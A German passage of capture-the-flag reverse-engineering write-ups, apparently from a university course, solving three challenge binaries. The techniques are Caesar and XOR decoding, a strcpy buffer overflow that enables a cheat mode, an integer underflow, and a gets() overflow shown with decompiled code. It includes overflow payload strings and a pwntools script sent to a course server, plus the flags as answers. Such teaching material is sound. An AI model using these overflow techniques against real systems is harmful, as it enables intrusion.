Es gibt eine Funktion shuffle in der Main-Methode, welche das erste Zeichen eines Strings durch das letzte ersetzt (und dann tauscht), das zweite durchs vorletzte etc.

Führen wir dies einmal von Hand auf die angegebenen Hex-Werte aus erhalten wir _nicht_ die Flag, sondern:  
`I_know_Y0U_C4nt_Crack_it` wird zu `ti_kcarC_tn4C_U0Y_wonk_I`

Die Funktion encrypt() caesar-verschlüsselt den vorgegebenen String mit einem Shift um 10. 
Die Funktion encryptDecrypt() verschlüsselt jedes Zeichen eines Strings mit 0x4b.  
Die Funktion decrypt() verwendet den gleichen Code wie team_03, übergibt jedoch ein paar weitere Parameter. Auch hier wird eine Caesar-Ciphre implementiert.

Wir können also das umgedrehte Passwort caesar-verschlüsseln um 10, erhalten `ds_umkbM_dx4M_E0I_gyxu_S`, also die Eingabe für das Passwort. Für die Ausführung und den Ausgabewert siehe angehängtes Script.

## Script
```python
nojo@Nojo:~/ree/team01$ ./team_04
Enter the password: ds_umkbM_dx4M_E0I_gyxu_S
4Ole�Flag{Humpty Shuffly BOOO}
## Flag
Flag{Humpty Shuffly BOOO}
```
#  Team 03
```

 
## Lösung
 
Es gibt einen Cheatmode, den man über einen Bufferoverflow beim strcp ausnutzen kann (username in einen 10er Buffer), deswegen können wir dort einfach 14 Zeichen eingeben.
 
"AAAAAAAAAAcheat" --> buffer overflow beim strcp vom username in den 10er buffer
 
Außerdem muss man noch ein Passwort herausfinden, der Input wird in eine Funktion crypter() geschmissen, diese Caesar-verschlüsselt den String mit einem Shift von 10. Somit können wir die Hex-Werte manuell um 10 verschieben und erhalten das Passwort "Sternenstaubdrache", welches wir anschließend wie im Script gezeigt verwenden können, um das Spiel zu starten.
 
```c
 
void gameLoop(undefined8 param_1,long cheatmode)
 
{
  int selected;
  uint nonCheatSkillup;
  int skillUpAmount;
  int command;
  uint local_28;
  uint turn;
  uint j;
  uint i;
  uint availableSkillpoints;
  uint dmg;
  uint vitality;
  uint strength;
 
  strength = 0;
  vitality = 0;
  local_28 = 400;
  dmg = 10;
  availableSkillpoints = 10;
  while( true ) {
    system("clear");
    puts("-------------------------------------------------------");
    printf("Available Attribute Points: %d\n\n",(ulong)availableSkillpoints);
    puts("Current Stats:");
    printf("Strength: %u\n",(ulong)strength);
    printf("Vitality: %u\n",(ulong)vitality);
    puts("-------------------------------------------------------");
    puts("1. Add points to Strength");
    puts("2. Add points to Vitality");
    puts("3. Fight Endboss");
    puts("4. Quit");
    puts("-------------------------------------------------------");
    printf("Enter your choice (1/2/3/4): ");
    while ((selected = __isoc99_scanf(&DAT_00102eac,&command), selected != 1 ||
           ((((command != 1 && (command != 2)) && (command != 3)) && (command != 4))))) {
      puts("Invalid input. Please enter a valid choice.");
      do {
        selected = getchar();
      } while (selected != 10);
    }
    if (command == 4) {
      system("clear");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (command == 3) break;
    if (cheatmode == 0x7461656863) {
      printf("Enter the number of points to add: ");
      while ((selected = __isoc99_scanf(&DAT_00102f0e,&skillUpAmount), selected != 1 ||
             ((int)availableSkillpoints < skillUpAmount))) {
        puts("Invalid input. Please enter a valid number of points.");
        do {
          selected = getchar();
        } while (selected != 10);
      }
      availableSkillpoints = availableSkillpoints - skillUpAmount;
      if (command == 1) {
        strength = strength + skillUpAmount;
      }
      else if (command == 2) {
        vitality = vitality + skillUpAmount;
      }
    }
    else {
      printf("Enter the number of points to add: ");
      while ((selected = __isoc99_scanf(&DAT_00102f0e,&nonCheatSkillup), selected != 1 ||
             (availableSkillpoints < nonCheatSkillup))) {
        puts("Invalid input. Please enter a valid number of points.");
        do {
          selected = getchar();
        } while (selected != 10);
      }
      availableSkillpoints = availableSkillpoints - nonCheatSkillup;
      if (command == 1) {
        strength = strength + nonCheatSkillup;
      }
      else if (command == 2) {
        vitality = vitality + nonCheatSkillup;
      }
    }
  }
  if (strength != 0) {
    for (i = 0; i < strength; i = i + 1) {
      selected = getRandom();
      dmg = dmg + selected * 5;
      if (999 < dmg) break;
    }
  }
  if (vitality != 0) {
    for (j = 0; j < vitality; j = j + 1) {
      selected = getRandom();
      player_hp = player_hp + selected * 5;
      if (4999 < (int)player_hp) break;
    }
  }
  system("clear");
  puts("-------------------------------------------------------");
  puts("Final Stats:");
  printf("Strength: %u\n",(ulong)strength);
  printf("Vitality: %u\n",(ulong)vitality);
  printf("Player HP: %i\n",(ulong)player_hp);
  printf("Player DMG: %i\n",(ulong)dmg);
  printf("Available Points: %i\n",(ulong)availableSkillpoints);
  puts("-------------------------------------------------------");
  puts("Battle Starts...\n");
  sleep(5);
  printPlayerVsEndboss();
  sleep(3);
  system("clear");
  turn = 1;
  do {
    if ((turn & 1) == 0) {
      puts("Player attacks back with legendary Sword Excalibur\n");
      printf("Attack DMG=%d\n\n",(ulong)dmg);
      printSword();
      endboss_hp = endboss_hp - dmg;
      sleep(3);
      system("clear");
      printPlayerVsEndboss();
      sleep(3);
      system("clear");
      if (endboss_hp < 1) {
        win();
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
    }
    else {
      puts("Dragon attacks with Fireeeee");
      printf("Attack DMG=%d\n\n",(ulong)local_28);
      printFireAttack();
      player_hp = player_hp - local_28;
      sleep(3);
      system("clear");
      printPlayerVsEndboss();
      sleep(3);
      system("clear");
      if ((int)player_hp < 1) {
        printGameOver();
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
    }
    turn = turn + 1;
  } while( true );
}
```
 
Das aktiviert eine Unterscheidung, der Code ist nahezu identisch bis auf das (int)-Cast. Dadurch kann man eine negative Zahl eingeben bei der Statverteilung und somit 5k HP und 1k DMG bekommen (integer underflow durch den Cast). Der Rest spielt sich von alleine, man gewinnt das Spiel und erhält die Flag. Super cute gemacht. Unten ist ein Script, was das ganze automatisiert. Weitere Erklärungen werden für nicht notwendig befunden, da keine weiteren Exploits angewandt werden.
 
## Script
```python
from pwn import *
 
pty = process.PTY
# p = process("./team_03", stdin=pty, stdout=pty)
p = remote("tank.informatik.hs-mannheim.de", 3103)
# context.log_level = 'debug'
 
p.sendlineafter(b": ", b"AAAAAAAAAAcheat")
p.sendlineafter(b": ", b"Sternenstaubdrache")
 
p.sendlineafter(b"): ", b"1")
p.sendlineafter(b": ", b"-1")
p.sendlineafter(b"): ", b"2")
p.sendlineafter(b": ", b"-1")
p.sendlineafter(b"): ", b"3")
 
# p.recvuntil("FLAG{")
flag = p.recvall().decode()
 
print(flag)


## Flag
FLAG{dr4g0n_sl4y3r}
```
# Team 01

 
## Lösung 
 
Main ruft eine Validate-Methode auf mit einem String, der nur Hex-Characters beinhaltet.  
Die Validate Methode sieht wie folgt aus (ja, Funktion, ich verwende die Begriffe für die folgenden Writeups synonym, auch wenn diese es nicht sind):
```c
void validate(char *someString)
 
{
  undefined relevant;
  undefined local_3a;
  undefined local_39;
  undefined local_38;
  char userInput [25];
  undefined8 on;
  undefined2 local_16;
  undefined local_14;
  undefined local_13;
  undefined local_12;
  undefined local_11;
  undefined4 binaryNumber;
  int someNum;
 
  on = 0x4f4e;
  local_16 = 0;
  printf("Enter the secret code: ");
  gets(userInput);
  someNum = atoi((char *)&on);
  binaryNumber = fromGray(someNum);
  relevant = (undefined)((uint)binaryNumber >> 0x18);
  local_3a = (undefined)((uint)binaryNumber >> 0x10);
  local_39 = (undefined)((uint)binaryNumber >> 8);
  local_38 = (undefined)binaryNumber;
  local_14 = local_38;
  local_13 = local_39;
  local_12 = local_3a;
  local_11 = relevant;
  xorHexPairs(someString,&relevant);
  return;
}
```
 
Das Programm liest eine Nutzereingabe ein, wandelt diese in eine Zahl um, diese wird dann als Gray-Code interpretiert, die hierbei resultierende Zahl wird anschließend geshiftet und in eine Funktion xorHexPairs übergeben.
 
```c
void xorHexPairs(char *someString,long someXorShift)
 
{
  size_t stringLength;
  uint hexOutput;
  char hexInput;
  char right;
  undefined local_19;
  uint result;
  uint shifted;
  int len;
  int i;
 
  stringLength = strlen(someString);
  len = (int)stringLength;
  if ((stringLength & 1) == 0) {
    for (i = 0; i < len; i = i + 2) {
      hexInput = someString[i];
      right = someString[(long)i + 1];
      local_19 = 0;
      __isoc99_sscanf(&hexInput,&DAT_00100bc8,&hexOutput);
      shifted = (uint)*(char *)(someXorShift + (i / 2) % 4);
      result = hexOutput ^ shifted;
      putchar(result);
    }
  }
  return;
}
```
 
Diese nimmt den String aus der main-Funktion und den geshifteten Userinput als Shifting-Parameter für eine Reihe von Operationen auf dem String.
Ziel ist es eine Eingabe zu finden, welche den String dekodiert. Um den gesuchten Schlüssel zu finden wenden wir eine Known Plaintext Attacke an und versuchen unser Glück [sic!], in dem wir die ersten bytes des Strings mit "FLAG{" xor'en. Dies genügt, da der Schlüssel maximal 4 Zeichen lang ist.  
Wir erhalten "lotrl", und sehen, dass der Key sich wiederholt (ist ebenfalls trivial aus dem Code ersichtlich).
 
Theoretisch ist es an dieser Stelle möglich einfach den String mit `2a233535171b1c17153015000930001307061a15331b1c1733071b100e060001331b1b2d051c111c0b0e061611 ^ lotrlotrlotrlotrlotrlotrlotrlotrlotrlotrlotrl = FLAG{they_are_taking_the_hobbits_to_isengard}` zu berechnen, jedoch ist das etwas langweilig. (und zudem wahrscheinlich nicht erlaubt, da das direkte extrahieren aus dem Programm nicht erlaubt war)
 
## Konstruktion des Eingabe Parameters
Es muss ein Bufferoverflow verwendet werden um die Variable on zu überschreiben (Name gewählt, da 0x4f4e ON in ASCII ist).  
Hierfür müssen 25 beliebige Zeichen und dann einige Ziffern eingegeben werden (atoi). Beginnen wir von hinten, es wird der String aus der Validate xor'ed mit dem i.ten Zeichen des Keys, also müssen wir in on "lotr" schreiben. Dafür wandeln wir "lotr" in Hex um (6C 6F 74 72), das dann in Graycode (1011010010110001100111001001011) und parsen das ganze wieder in eine Dezimalzahl (1515769419).
 
Somit erhalten wir:
```
./team_01
Enter the secret code: AAAAAAAAAAAAAAAAAAAAAAAAA1515769419
FLAG{they_are_taking_the_hobbits_to_isengard}
```
 
Fertig. XOR for the win


## Flag
`FLAG{they_are_taking_the_hobbits_to_isengard}`
```



